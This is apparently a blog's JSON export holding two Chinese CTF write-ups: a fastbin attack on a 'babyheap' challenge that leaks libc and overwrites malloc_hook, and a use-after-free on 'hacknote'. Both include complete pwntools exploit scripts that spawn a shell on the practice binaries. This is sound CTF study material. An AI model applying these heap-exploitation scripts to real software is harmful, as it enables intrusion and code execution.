123456789101112131415161718192021222324252627282930__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char *v4; // [rsp+8h] [rbp-8h] v4 = sub_B70(); while ( 1 ) &#123; menu(); Read(); switch ( off_14F4 ) &#123; case 1uLL: Add(v4); break; case 2uLL: Fill(v4); break; case 3uLL: Free(v4); break; case 4uLL: Dump(v4); break; case 5uLL: return 0LL; default: continue; &#125; &#125;&#125; Add()：新建chunk,由用户输入size,用calloc分配内存,先行初始化chunk。 Fill()：写入chunk,由用户决定size，与Add()size不同,所以存在堆溢出。 Free()：删除chunk,而且指针置空,不存在UAF漏洞。 Dump()：输出chunk,没啥特别。 另外还有一点就是，文件存在alarm()函数，因此在调试时有时间限制。 不过只要在伪代码中，将汇编指令修改一下，将call alarm改成nop就行。 所以说我们可以利用的只有堆溢出这一个漏洞。 B.Leak Libc_base对于这个题目可以进行fastbin_attack,先新建5个chunk，大小功能如下。 12345 Add(0x20) #used for overwrite Add(0x20) Add(0x20) #used to point the same aera of chunk4 Add(0x20) #used for overwriteAdd(0x80) #used to leak the libc_base 各个堆块结构如下： ​ 根据堆结构，填充空余部分时要这样写脚本： 12 payload = p64(0) * 5 + p64(31)payload+= p64(0) * 5 + p64(31) + p8(0xC0) ​ p8(0xC0)也就刚好覆盖到了chunk2的FD指针。接着就是一系列内存布局，目的是让leak出small chunk2的FD指针，因为当程序中只有一个small/unsort chunk在链表上时，其FD和BK都指向距离main_arena 0x58的地址。也就是说： Leak_addr - 0x58 = main_arena main_arena - 0x3c4b20 = libc_base 内存布局如下(非实际脚本，仅用于理解)： 123456789101112 free(chunk1) main_arena--&gt;chunk1 free(chunk2) main_arena--&gt;chunk2--&gt;chunk1 fill(chunk0) main_arena--&gt;chunk2--&gt;chunk4 #overwrite fill(chunk3) #modify the size of chunk4 (0x91 --&gt; 0x31) #so we can malloc chunk4 as fastbin add(0x20) main_arena--&gt;chunk4&lt;--chunk2 add(0x20) main_arena chunk4&lt;--chunk2 #share the same addr fill(chunk3) #modify the size of chunk4 (0x91 --&gt; 0x31)#so we can pass the check and free chunk4 as smallbin add(0x80) #chunk 5 , for avoiding the merging into top_chunkfree(chunk4) main_arena-0x58&lt;--chunk4&lt;--chunk2 dump(chunk2) #Leak libc_base ​ 经过布局之后可以使得chunk2和chunk4指向相同。 C. Getshell​ 那么现在有了libc_base要怎么利用咧。可以通过one_gadget搜libc里的excute(“/bin/sh”)，搜出来的不止一个，需要一个个尝试，再找机会调用运行。今天新学到的一个小姿势：main_arena上方有一个函数指针叫malloc_hook，正常情况下为空，但如果系统在调用malloc， realloc，free时监测到malloc_hook非空就会立即执行malloc_hook中的汇编指令。针对malloc_hook的攻击会另外再写一篇小记。 ​ 所以说利用思路就是：可以利用堆，修改堆的FD指针指向malloc_hook的一定偏移处，使得fill(chunk)时可以恰好覆盖到malloc_hook并执行。 将chunk4申请出来并将其大小压缩在fastchunk的范围。 释放chunk4，此时用chunk2覆写chunk4的FD指针，使其指向距离malloc_hook的一定偏移处。(准确地址为libc_base+0x3C4AED，在此处恰好可以分配到合适的fastbin，这里的偏移计算涉及malloc_hook攻击。) 申请两个chunk(fastchunk)，第一次会分配到chunk4，第二次会分配到新的chunk6，chunk6的地址正是目标地址。 将shellcode写入到chunk6。 执行一次add()即可getshell。 D.Exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475from pwn import *context.log_level = &quot;debug&quot;p = process(&#x27;./babyheap&#x27;)env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;def add(size): p.sendlineafter(&quot;Command: &quot;,str(1)) p.sendlineafter(&quot;Size: &quot;,str(size)) def fill(index,content): p.sendlineafter(&quot;Command: &quot;,str(2)) p.sendlineafter(&quot;Index: &quot;,str(index)) p.sendlineafter(&quot;Size: &quot;,str(len(content))) p.sendlineafter(&quot;Content: &quot;,content)def free(): p.sendlineafter(&quot;Command: &quot;,str(3)) p.sendlineafter(&quot;Index: &quot;,str(index)) def dump(): p.sendlineafter(&quot;Command: &quot;,str(4)) p.sendlineafter(&quot;Index: &quot;,str(index)) return p.recvline()add(0x20) #used for overwrite 0x..............00add(0x20) # 0x..............30add(0x20) #used to point the same aera of chunk4 0x..............60add(0x20) #used for overwrite 0x..............90add(0x80) #used to leak the libc_base 0x..............C0free(1)free(2)payload = p64(0) * 5payload+=p64(0x31)payload+=p64(0) * 5payload+=p64(0x31)payload+=p64(0xC0)fill(0,payload) #now the chunk2 is pointing at the chunk4, they share the same addr#In order to draw the chunk4 into fastbin ,its size need to be modifiedpayload = p64(0) * 5payload+=p64(0x31)fill(3,payload) #now the size of chunk4 is 0x30,we can easily malloc it as a fastchunkadd(0x20) #chunk2add(0x20) #chunk4#In order to put the chunk4 into smallbin ,its size need to be modifiedpayload = p64(0) * 5payload+=p64(0x91)fill(3,payload) #now the size of chunk4 is 0x90,we can easily free it as a smallchunkadd(0x80) #avoid merging into top_chunk :chunk5free(4) #here we&#x27;ve got the fd ptr of chunk4,which is pointing at main_arena-0x58 while it was freedfd_ptr = u64(dump(2)[:8])main_arena = fd_ptr - 0x58libc_base = main_arena - 0x3c4b20 #0x3c4b20 is the offset of main_arena in libcadd(0x60) #transform the chunk4 into fastchunk again,so we are able to fastbin attackfree(4) payload = p64(0) * 5payload+=p64(main_arena - 0x33) #the same as : malloc_hook-0x23 || libc_base+0x3C4B20-0x33 || libc_base - 0x3C4AEDfill(3,payload)add(0x60) #chunk 4add(0x60) #chunk 6payload = &#x27;A&#x27;*3 #length of &quot;AAA&quot;+p64(0)*2 = 0x23,it&#x27;s the very length to fill the malloc_hookpayload+=p64(0) * 2payload+=p64(libc_base + 0x4526a)fill(6,payload)add(1) #add() to call excute(&quot;/bin/sh&quot;) &quot;1&quot;has not meaningp.interactive()","categories":[],"tags":[]},{"title":"UAF (Hacknote)","slug":"UAF-Hacknote","date":"2020-02-28T03:14:08.000Z","updated":"2021-03-23T08:39:13.220Z","comments":true,"path":"2020/02/28/UAF-Hacknote/","link":"","permalink":"http://example.com/2020/02/28/UAF-Hacknote/","excerpt":"​ 从头开始学习堆堆堆堆😥😥😥（其实之前也没学多少）。","text":"​ 从头开始学习堆堆堆堆😥😥😥（其实之前也没学多少）。 ​ 课设做很久了，摸鱼划水也很久了，抓紧时间系统地肝一下堆题吧。再不好好学要废了。。 1.关于UAF​ 在malloc得到一个指针并使用后，通常要将其释放并置空。若是出现未将其置空的情况，就容易出现可利用的漏洞，使得用户仍然可以运用指针内的数据或是调用其中的指令。简单来说i，UAF就是对一个已释放内存块的再利用。 CTF - wiki 相关如下： 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。 （Link - https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/） Example from how2heap1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; typedef struct name &#123; char *myname; void (*func)(char *str); &#125; NAME; void myprint(char *str) &#123; printf(&quot;%s\\n&quot;, str); &#125; void printmyname() &#123; printf(&quot;call print my name\\n&quot;); &#125; int main() &#123; NAME *a; a = (NAME *)malloc(sizeof(struct name)); a-&gt;func = myprint; a-&gt;myname = &quot;I can also use it&quot;; a-&gt;func(&quot;this is my function&quot;); // free without modify free(a); a-&gt;func(&quot;I can also use it&quot;); // free with modify a-&gt;func = printmyname; a-&gt;func(&quot;this is my function&quot;); // set NULL a = NULL; printf(&quot;this pogram will crash...\\n&quot;); a-&gt;func(&quot;can not be printed...&quot;); &#125;/*The output:$use_after_free git:(use_after_free) ✗ ./use_after_free this is my functionI can also use itcall print my namethis pogram will crash...[1] 38738 segmentation fault (core dumped) ./use_after_free*/ 2.hacknote复现​ (Link - https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote) A.题目分析​ 常规操作：丢Ubuntu 1.checksec 2.file（其实有保护也不会绕过。。。tcl） ​ 然后丢IDA看源码和伪码： ​ 主要函数有这几个，添加删除输出主函数，magic()是喜闻乐见的system后门。菜鸡看到后门函数的第一直觉就是改got表，或者ROP。。。但这里好像不太行，怎么说也是个正经堆题啊。 ​ add_note: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546unsigned int add_note()&#123; _DWORD *v0; // ebx signed int i; // [esp+Ch] [ebp-1Ch] int size; // [esp+10h] [ebp-18h] char buf; // [esp+14h] [ebp-14h] unsigned int v5; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword(0x14u); if ( count &lt;= 5 ) &#123; for ( i = 0; i &lt;= 4; ++i ) &#123; if ( !notelist[i] ) &#123; notelist[i] = malloc(8u); if ( !notelist[i] ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; *notelist[i] = print_note_content; // put字段，*notelist[i]为函数指针 printf(&quot;Note size :&quot;); read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = notelist[i]; v0[1] = malloc(size); if ( !*(notelist[i] + 1) ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; printf(&quot;Content :&quot;); read(0, *(notelist[i] + 1), size); puts(&quot;Success !&quot;); ++count; return __readgsdword(0x14u) ^ v5; &#125; &#125; &#125; else &#123; puts(&quot;Full&quot;); &#125; return __readgsdword(0x14u) ^ v5;&#125; ​ print_note:调用了note中的函数指针，即print_content_function()函数 12345678910111213141516171819unsigned int print_note()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( notelist[v1] ) (*notelist[v1])(notelist[v1]); // 调用notelist[v1]所指函数 return __readgsdword(0x14u) ^ v3; // 因此利用思路为：改写notelist[v1]之所指&#125; ​ del_note:在此函数中发现，函数仅对堆进行free，但并未置空，因此存在UAF漏洞。 1234567891011121314151617181920212223unsigned int del_note()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( notelist[v1] ) &#123; free(*(notelist[v1] + 1)); free(notelist[v1]); puts(&quot;Success&quot;); &#125; return __readgsdword(0x14u) ^ v3;&#125; ​ 还有要注意的是，对于每个note，都有一个notelist函数指针ptr，指向print_note_content()。并在新建note的时候就会被初始化为print_note_content(),所以无法对于单个note的ptr进行改写。 print_note_content: 1234int __cdecl print_note_content(int a1)&#123; return puts(*(a1 + 4));&#125; ​ 也就是说每一个note，都包含了两个chunk，第一个（8 bytes）存的是函数指针ptr，另一个是指向内容的指针ptr_content。第二个存的是用户输入的content。 B.利用思路​ 1.能由用户控制的内容只有content，所以基本思路就是用一个note_a的输入过程，去改写note_b的函数指针ptr，再print(note_b) ​ 2.要使得note_b被note_a改写，除非后者进行堆溢出，或者两者再某一时刻同时指向同一块内存区域。因此可以想到利用UAF漏洞，先free(note_b)再add(note_a)，将payload写入到note_a中。 ​ 3.如果有两个相邻的note，四个相邻的chunk，结构如下： - 对于函数指针和内容指针，各占4 Bytes，再加上其他chunk数据并遵循堆内存对齐，可知chunk1和chunk3分别为16 Bytes。 分别free之后bin链表内容为：(head) chunk1 –&gt; chunk2 –&gt; chunk3 –&gt; chunk4 (tail)此时再申请出note2，作为改写用的note_a。 而在malloc时，如果chunk2和chunk4的大小(即size of content)大于16 Bytes，且note_a大小小于16 Bytes，系统就会从bin链表尾部向头部寻找适当大小的已释放chunk，进而将chunk3和chunk1分配给note_a，而chunk3和chunk1中的两个指针正是我们要改写的地方。 所以我们知道，需要给note0和note1的content部分分配32bytes的大小。 ​ 4.内存分配情况决定之后，只需要将note0视作note_b，在note_a中写入payload（note_a的content部分与note_b的content部分为同一内存块），即可改写note_b的函数指针。调用函数print(note_b)即可getshell。 C.exp:123456789101112131415161718192021222324252627282930313233343536from pwn import *r = process(&#x27;./hacknote&#x27;)def addnote(size, content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(content) def delnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def printnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))magic = 0x08048986addnote(32, &quot;aaaa&quot;) # add note 0addnote(32, &quot;ddaa&quot;) # add note 1delnote(0) # delete note 0delnote(1) # delete note 1addnote(8, p32(magic)) # add note 2printnote(0) # print note 0r.interactive()","categories":[],"tags":[]}],"categories":[],"tags":[]}